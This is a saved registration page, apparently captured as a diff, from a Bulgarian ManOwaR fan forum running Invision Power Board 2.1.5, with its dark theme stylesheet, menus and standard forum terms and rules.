+.rteBack tr td
+{
+	padding: 0;
+}
+
+.rteDiv
+{
+	display: block;
+	position: relative;
+	padding: 0px;
+	margin: 0px;
+}
+
+.rteiframe
+{
+	border: 1px solid #777;
+	background-color: #2F2F2F;
+}
+
+.rteselectbox
+{
+	font-size: 11px;
+}
+
+.dny-edit-title
+{
+	border: 0px;
+	padding: 3px;
+	margin: 0px;
+	background: #0C0C0C;
+	color: #5C5C5C;
+}
+
+.tabon
+{
+	border-top: 1px solid #999;
+	border-left: 1px solid #999;
+	border-right: 1px solid #999;
+	background-color: #2F2F2F;
+	padding: 8px;
+	padding-bottom: 9px;
+	font-size: 10px;
+	float: left;
+	width: auto;
+	margin-top: 3px;
+}
+
+.taboff
+{
+	border-top: 1px solid #777;
+	border-left: 1px solid #777;
+	border-right: 1px solid #777;
+	background-color: #565656;
+	color: #333;
+	padding: 8px;
+	font-size: 10px;
+	float: left;
+	width: auto;
+	margin-top: 3px;
+}
+
+.tabon a:link, 
+.tabon a:visited, 
+.tabon a:active
+{
+	text-decoration: none;
+	color: #000;
+}
+
+.taboff a:link, 
+.taboff a:visited, 
+.taboff a:active
+{
+	text-decoration: none;
+	color: #333;
+}
+
+.mya-back
+{
+	background: #2F2F2F;
+	margin: 1px;
+}
+
+.mya-content
+{
+	background: #2F2F2F;
+	padding: 8px;
+	margin: 1px;
+	border: 1px solid #777;
+}
+
+.iframeshim
+{
+	position: absolute;
+	display: none;
+	background: #2F2F2F;
+	filter: alpha(opacity=0);
+	border: 0px;
+	width: auto;
+	height: auto;
+}
+
+.popupmenu
+{
+	background: #191919;
+	border: 1px solid #5C5C5C;
+	text-align: left;
+	font-size: 10px;
+	white-space: nowrap;
+}
+
+.popupmenu-item
+{
+	padding: 5px;
+	white-space: nowrap;
+	border-bottom: 1px solid #000000;
+}
+
+.popupmenu-item-last
+{
+	padding: 5px;
+	white-space: nowrap;
+}
+
+.popmenubutton
+{
+	width: 120px;
+	white-space: nowrap;
+	background-color: #000000;
+	border: 1px solid #5C5C5C;
+	color: #5C5C5C;
+	font-weight: bold;
+	float: right;
+	text-align: center;
+	margin: 0px;
+	font-size: 10px;
+	padding: 1px;
+}
+
+.popmenubutton a:link, 
+.popmenubutton a:visited,
+.popupmenu-item a:link, 
+.popupmenu-item a:visited,
+.popupmenu-item-last a:link, 
+.popupmenu-item-last a:visited
+{
+	color: #5C5C5C;
+	text-decoration: none;
+}
+
+.popmenubutton a:hover, 
+.popupmenu-item a:hover, 
+.popupmenu-item-last a:hover
+{
+	color: #5C5C5C;
+	text-decoration: none;
+}
+
+.popupmenu-category
+{
+	background: transparent url(style_images/valhalla/tile_sub.gif);
+	border-top: 1px solid #5C5C5C;
+	border-bottom: 1px solid #5C5C5C;
+	color: #5C5C5C;
+	font-size: 10px;
+	font-weight: bold;
+	letter-spacing: 1px;
+	margin: 0;
+	padding: 5px;
+}
+
+
+</style> 
+ 
+</head> 
+<body>
+<body bgcolor="#E8E4DB">
+<div id="ipbwrapper">
+<table width="100%"  border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td width="80px" style="background-color:#000000; background-image:url(style_images/valhalla/left.gif); background-repeat:repeat-y"></td>
+    <td>
+<!--ipb.javascript.start-->
+<script type="text/javascript">
+ //<![CDATA[
+ var ipb_var_st            = "";
+ var ipb_lang_tpl_q1       = "Моля изберете номер на страница между 1 и";
+ var ipb_var_s             = "5ae447d08f4e4a993efaa086914ed537";
+ var ipb_var_phpext        = "php";
+ var ipb_var_base_url      = "http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&";
+ var ipb_var_image_url     = "style_images/valhalla";
+ var ipb_input_f           = "";
+ var ipb_input_t           = "";
+ var ipb_input_p           = "";
+ var ipb_var_cookieid      = "";
+ var ipb_var_cookie_domain = "";
+ var ipb_var_cookie_path   = "";
+ var ipb_md5_check         = "880ea6a14ea49e853634fbdc5015a024";
+ var ipb_new_msgs          = 0;
+ var use_enhanced_js       = 1;
+ //]]>
+</script>
+<script type="text/javascript" src='jscripts/ipb_global.js'></script>
+<script type="text/javascript" src='jscripts/ips_menu.js'></script>
+<script type="text/javascript" src='style_images/valhalla/folder_js_skin/ips_menu_html.js'></script>
+<!--ipb.javascript.end-->
+<div class="borderwrap">
+	<div id="logostrip"><center><a href='http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;'><!--ipb.logo.start--><img src='style_images/valhalla/header_new.gif' style='vertical-align:top' alt='ManOwaR-bg.org' border='0' /><!--ipb.logo.end--></a></center></div>
+	<div id="submenu">
+		<p class="home"><!--ipb.leftlinks.start--><a href=""></a><!--IBF.RULES--><!--ipb.leftlinks.end--></p>
+		<p><!--ipb.rightlinks.start--><a href="http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;act=module&module=gallery">Галерия</a>	<a href="http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;act=Help">Помощ</a><a href="http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;act=Search&amp;f=">Търсене</a><a href="http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;act=Members">Потребители</a><a href="http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;act=calendar">Календар</a><a href='http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;act=Shoutbox'>Викалня</a>
+		<!--ipb.rightlinks.end--></p>
+	</div>
+</div><script type="text/javascript" src='jscripts/ips_xmlhttprequest.js'></script>
+<script type="text/javascript" src='jscripts/ipb_global_xmlenhanced.js'></script>
+<script type="text/javascript" src='jscripts/dom-drag.js'></script>
+<div id='get-myassistant' style='display:none;width:400px;text-align:left'>
+<div class="borderwrap">
+ <div class='maintitle' id='myass-drag' title='Кликни и задръж, за да преместиш този прозорец'>
+  <div style='float:right'><a href='#' onclick='document.getElementById("get-myassistant").style.display="none"'>[X]</a></div>
+  <div>Моят асистент</div>
+ </div>
+ <div id='myass-content'></div>
+ </div>
+</div>
+<div id='loading-layer' style='display:none;width:200px;height:50px;background:#FFF;padding:10px;text-align:center;border:1px solid #000'><div style='font-weight:bold' id='loading-layer-text'>Зареждане. Моля изчакайте...</div><br /><img src='style_images/valhalla/loading.gif'  border='0' /></div><!-- / End board header -->
+<div id="userlinksguest">
+	<p class="pcen"><b>Здравейте</b> ( <a href="http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;act=Login&amp;CODE=00">Вход</a> | <a href="http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;act=Reg&amp;CODE=00">Регистрация</a> )	</p>
+</div>
+<!--D2-SHOUTBOX-->
+<div id="navstrip"><img src='style_images/valhalla/nav.gif' border='0'  alt='&gt;' />&nbsp;<a href='http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;act=idx'>ManOwaR-BG Forums</a>&nbsp;>&nbsp;Регистрация</div>
+<!--IBF.NEWPMBOX-->
+<form action="http://manowar-bg.org/forums/index.php?s=5ae447d08f4e4a993efaa086914ed537&amp;act=Reg&coppa_user=0&termsread=1&coppa_pass=1" method="post">
+	<div class="borderwrap">
+		<div class="maintitle">Условия за регистрация</div>
+		<table class='ipbtable' cellspacing="1">
+			<tr>
+				<th>Запознайте се с правилата за регистрация:</th>
+			</tr>
+			<tr>
+				<td class="row1"><b>Forum Terms & Rules</b><br /><br />Please take a moment to review these rules detailed below. If you agree with them and wish to proceed with the registration, simply click the "Register" button below. To cancel this registration, simply hit the 'back' button on your browser.<br /><br />Please remember that we are not responsible for any messages posted. We do not vouch for or warrant the accuracy, completeness or usefulness of any message, and are not responsible for the contents of any message.<br /><br />The messages express the views of the author of the message, not necessarily the views of this bulletin board. Any user who feels that a posted message is objectionable is encouraged to contact us immediately by email. We have the ability to remove objectionable messages and we will make every effort to do so, within a reasonable time frame, if we determine that removal is necessary.<br /><br />You agree, through your use of this service, that you will not use this bulletin board to post any material which is knowingly false and/or defamatory, inaccurate, abusive, vulgar, hateful, harassing, obscene, profane, sexually oriented, threatening, invasive of a person's privacy, or otherwise violative of any law.<br /><br />You agree not to post any copyrighted material unless the copyright is owned by you or by this bulletin board.<br /></td>
+			</tr>
+			<tr>
+				<td class="row2"><label for="agree_cbox"><input type="checkbox" id="agree_cbox" name="agree_to_terms" value="1" /> <b>Съгласен  съм</b></label></td>
+			</tr>
+			<tr>
+				<td class="formbuttonrow"><input type="submit" value="Регистрирайте ме" class="button"></td>
+			</tr>
+			<tr>
+				<td class="catend" colspan="2"><!-- no content --></td>
+			</tr>
+		</table>
+	</div>
+</form><!--TASK--><!--ETASK-->
+<table cellspacing="0" id="gfooter">
+	<tr>
+		<td width="45%"> </td>
+		<td width="10%" align="center" nowrap="nowrap"><a href="lofiversion/index.php"><b>Lo-Fi версия</b></a></td>
+		<td width="45%" align="right" nowrap="nowrap">Дата и час: 26th February 2013 - 11:25 PM</td>
+	</tr>
+</table>
+<br/>
+<div align="center">
+
+&copy; 2005, <b><a href="http://manowar-bg.org">Valhalla Team</b></a>. <br><a href="http://www.save-darina.org" target="_blank"><img src="http://i29.tinypic.com/30kfwr4.jpg" border="0"></a> <br><a href="http://www.koleda365.org" target="_blank"><img src="http://i26.tinypic.com/352jdlj.jpg" border="0"></a>
+</div>
+<br/>
+<script type='text/javascript'>
+//<![CDATA[
+menu_do_global_init();//]]>
+</script>
+ 
+<!-- Copyright Information -->
+        				  <div align='center' class='copyright'>
+        				  	Invision Power Board
+        				  	v2.1.5 &copy; 2013 &nbsp;IPS, Inc.
+        				  </div>
+		<!-- / Copyright -->
+</td>
+    <td width="80px" style="background-color:#000000; background-image:url(style_images/valhalla/right.gif); background-repeat:repeat-y"></td>
+  </tr>
+</table>
+</div>
+</body> 
+</html>
+<script src = "jscripts/kb-iemo.js" id="kscr" auto=2 top="-18" left="-21" span=0 buttonstyle="width:22;height:20;fontSize:8pt" tip="" menucaptions=""></script>
